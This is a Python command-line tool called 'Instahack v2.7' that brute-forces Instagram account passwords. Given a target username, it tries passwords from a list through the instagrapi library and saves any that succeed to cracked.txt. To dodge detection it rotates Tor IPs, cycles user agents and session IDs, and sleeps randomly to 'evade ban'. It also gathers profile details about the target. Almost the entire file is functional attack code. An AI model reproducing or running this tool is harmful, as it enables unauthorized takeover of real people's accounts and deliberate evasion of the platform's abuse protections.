#!/usr/bin/env python3
import os, sys, time, json, random
from instagrapi import Client
from stem.control import Controller
from colorama import Fore, Style, init

init(autoreset=True)

SMART_ANTIBAN_ENABLED = True
DATA_DIR = os.path.dirname(os.path.abspath(__file__))
USER_AGENT_FILE = os.path.join(DATA_DIR, "user_agents.json")
SESSIONID_FILE = os.path.join(DATA_DIR, "sessionids.json")
ACTIVE_UA = None
ACTIVE_SESSIONID = None

def load_json_file(path, default=None):
    """Load JSON data from *path*, creating the file with *default* on failure."""
    if default is None:
        default = []
    if not os.path.exists(path):
        save_json_file(path, default)
        return default
    with open(path, "r") as f:
        try:
            return json.load(f)
        except json.JSONDecodeError:
            save_json_file(path, default)
            return default

def save_json_file(path, data):
    with open(path, "w") as f:
        json.dump(data, f, indent=2)

def banner():
    print(Fore.CYAN + "="*60)
    print(Fore.YELLOW + "🛡️ Instahack v2.7 – Smart User-Agent & SessionID Manager")
    print(Fore.CYAN + "="*60)

def display_current():
    print(Fore.MAGENTA + f"\n[~] Active User-Agent: {ACTIVE_UA[:40]+'...' if ACTIVE_UA else 'None'}")
    print(Fore.MAGENTA + f"[~] Active SessionID: {ACTIVE_SESSIONID[:12]+'...' if ACTIVE_SESSIONID else 'None'}\n")

def change_ip():
    try:
        with Controller.from_port(port=9051) as controller:
            controller.authenticate(password='your_password')
            controller.signal('newnym')
        print(Fore.GREEN + "[✓] New Tor IP acquired.")
    except Exception as e:
        print(Fore.RED + f"[!] Tor IP rotation failed: {e}")

### USER-AGENT MANAGER ###
def manage_user_agents():
    agents = load_json_file(USER_AGENT_FILE)
    global ACTIVE_UA
    while True:
        print(Fore.CYAN + "\nUser-Agent Manager:")
        print("1. Add new User-Agent")
        print("2. Remove User-Agent")
        print("3. List User-Agents")
        print("4. Set Active User-Agent")
        print("5. Back to main menu")
        choice = input(Fore.YELLOW + "Choose option: ").strip()
        if choice == "1":
            ua = input("Paste User-Agent: ").strip()
            if ua and ua not in agents:
                agents.append(ua)
                save_json_file(USER_AGENT_FILE, agents)
                print(Fore.GREEN + "[+] User-Agent added.")
        elif choice == "2":
            for idx, ua in enumerate(agents):
                print(f"{idx+1}. {ua[:50]}")
            idx = input("Enter number to remove: ")
            try:
                idx = int(idx)-1
                removed = agents.pop(idx)
                save_json_file(USER_AGENT_FILE, agents)
                print(Fore.YELLOW + f"[-] Removed: {removed[:40]}...")
            except:
                print(Fore.RED + "[!] Invalid selection.")
        elif choice == "3":
            print("\nUser-Agents List:")
            for idx, ua in enumerate(agents):
                print(f"{idx+1}. {ua}")
        elif choice == "4":
            for idx, ua in enumerate(agents):
                print(f"{idx+1}. {ua[:60]}")
            idx = input("Enter number to set as active: ")
            try:
                ACTIVE_UA = agents[int(idx)-1]
                print(Fore.GREEN + "[✓] User-Agent activated.")
            except:
                print(Fore.RED + "[!] Invalid selection.")
        elif choice == "5":
            break
        else:
            print(Fore.RED + "[!] Invalid choice.")

### SESSIONID MANAGER ###
def manage_sessionids():
    sids = load_json_file(SESSIONID_FILE)
    global ACTIVE_SESSIONID
    while True:
        print(Fore.CYAN + "\nSessionID Manager:")
        print("1. Add new SessionID")
        print("2. Remove SessionID")
        print("3. List SessionIDs")
        print("4. Set Active SessionID")
        print("5. Back to main menu")
        choice = input(Fore.YELLOW + "Choose option: ").strip()
        if choice == "1":
            sid = input("Paste SessionID: ").strip()
            if sid and sid not in sids:
                sids.append(sid)
                save_json_file(SESSIONID_FILE, sids)
                print(Fore.GREEN + "[+] SessionID added.")
        elif choice == "2":
            for idx, sid in enumerate(sids):
                print(f"{idx+1}. {sid[:16]}...")
            idx = input("Enter number to remove: ")
            try:
                idx = int(idx)-1
                removed = sids.pop(idx)
                save_json_file(SESSIONID_FILE, sids)
                print(Fore.YELLOW + f"[-] Removed: {removed[:10]}...")
            except:
                print(Fore.RED + "[!] Invalid selection.")
        elif choice == "3":
            print("\nSessionIDs List:")
            for idx, sid in enumerate(sids):
                print(f"{idx+1}. {sid}")
        elif choice == "4":
            for idx, sid in enumerate(sids):
                print(f"{idx+1}. {sid[:20]}...")
            idx = input("Enter number to set as active: ")
            try:
                ACTIVE_SESSIONID = sids[int(idx)-1]
                print(Fore.GREEN + "[✓] SessionID activated.")
            except:
                print(Fore.RED + "[!] Invalid selection.")
        elif choice == "5":
            break
        else:
            print(Fore.RED + "[!] Invalid choice.")

def validate_active():
    if not ACTIVE_UA:
        print(Fore.RED + "[!] You must set a User-Agent (option 7) before proceeding.")
        return False
    if not ACTIVE_SESSIONID:
        print(Fore.YELLOW + "[!] SessionID not set. Attacks will use login/password only.")
    return True

def login_client():
    if not validate_active():
        return None
    client = Client()
    client.set_user_agent(ACTIVE_UA)
    if ACTIVE_SESSIONID:
        try:
            client.login_by_sessionid(ACTIVE_SESSIONID)
            me = client.account_info()
            print(Fore.GREEN + f"[✓] SessionID login verified: {me.username}")
        except Exception as e:
            print(Fore.RED + f"[!] SessionID login failed: {e}")
            return None
    return client

def gather_osint():
    if not validate_active(): return
    username = input(Fore.YELLOW + "Target username: ")
    try:
        client = login_client()
        if not client: return
        user = client.user_info_by_username(username)
        print(Fore.GREEN + f"Username: {user.username}")
        print(f"Full name: {user.full_name}")
        print(f"Bio: {user.biography}")
        print(f"Public: {'Yes' if not user.is_private else 'No'}")
        print(f"Followers: {user.follower_count}, Following: {user.following_count}")
    except Exception as e:
        print(Fore.RED + f"[!] Failed to gather OSINT: {e}")

def load_passwords(path):
    if not os.path.exists(path):
        print(Fore.YELLOW + f"[~] '{path}' not found. Creating default list.")
        with open(path, "w") as f:
            f.write("123456\npassword\nqwerty\nletmein\nadmin\n")
    with open(path) as f:
        return [line.strip() for line in f if line.strip()]

def try_login(client, username, password):
    try:
        client.login(username, password)
        if client.user_id:
            user = client.account_info()
            return True, f"Login verified. Bio: {user.biography}"
        else:
            return False, "Login failed silently"
    except Exception as e:
        return False, str(e)

def attack(username, passwords):
    delay = 3
    client = login_client()
    if not client:
        print(Fore.RED + "[!] Cannot attack: missing valid UA/SessionID.")
        return
    for pwd in passwords:
        print(Fore.YELLOW + f"[→] Trying: {pwd}")
        success, message = try_login(client, username, pwd)
        if success:
            print(Fore.GREEN + f"[✔️] Success! Password: {pwd}")
            print(Fore.BLUE + f"[ℹ️] {message}")
            with open("cracked.txt", "a") as f:
                f.write(f"{username}:{pwd}\n")
            return
        else:
            print(Fore.RED + f"[✘] Failed: {message}")
            if SMART_ANTIBAN_ENABLED:
                sleep = random.randint(delay, delay + 5)
                print(Fore.BLUE + f"[~] Sleeping {sleep}s to evade ban...")
                time.sleep(sleep)

def auto_attack():
    if not validate_active(): return
    username = input("Target username: ")
    passwords = load_passwords("password_list.txt")
    attack(username, passwords)

def manual_attack():
    if not validate_active(): return
    username = input("Target username: ")
    path = input("Password list file path: ")
    passwords = load_passwords(path)
    attack(username, passwords)

def toggle_antiban():
    global SMART_ANTIBAN_ENABLED
    SMART_ANTIBAN_ENABLED = not SMART_ANTIBAN_ENABLED
    state = "ON" if SMART_ANTIBAN_ENABLED else "OFF"
    print(Fore.CYAN + f"Smart Anti-Ban is now {state}")

def main():
    banner()
    while True:
        display_current()
        print(Fore.CYAN + "1. Gather OSINT")
        print("2. Auto Attack")
        print("3. Manual Attack")
        print("4. Toggle Smart Anti-Ban")
        print("5. Rotate Tor IP")
        print("6. Manage User-Agents")
        print("7. Manage SessionIDs")
        print("8. Exit")
        choice = input(Fore.YELLOW + "Choose option: ").strip()
        if choice == "1":
            gather_osint()
        elif choice == "2":
            auto_attack()
        elif choice == "3":
            manual_attack()
        elif choice == "4":
            toggle_antiban()
        elif choice == "5":
            change_ip()
        elif choice == "6":
            manage_user_agents()
        elif choice == "7":
            manage_sessionids()
        elif choice == "8":
            break
        else:
            print(Fore.RED + "[!] Invalid choice")

if __name__ == "__main__":
    main()
